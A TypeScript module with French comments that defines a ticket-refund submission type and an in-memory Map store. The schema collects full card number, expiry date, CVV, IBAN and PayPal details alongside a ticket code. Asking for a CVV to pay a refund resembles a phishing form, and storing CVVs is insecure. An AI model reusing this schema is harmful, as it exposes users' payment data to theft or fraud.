// Stockage temporaire en mémoire pour les soumissions (à remplacer par une base de données en production)
type Submission = {
  id: string;
  user_name: string;
  user_email: string;
  user_phone?: string;
  ticket_type: string;
  ticket_code: string;
  ticket_amount: string;
  submission_type?: string;
  reimbursement_method?: string;
  bank_iban?: string;
  paypal_email?: string;
  card_number?: string;
  card_expiry?: string;
  card_cvv?: string;
  card_name?: string;
  created_at?: string;
};

const store = new Map<string, Submission>();

export function saveSubmission(submission: Submission) {
  store.set(submission.id, submission);
}

export function getSubmission(id: string): Submission | undefined {
  return store.get(id);
}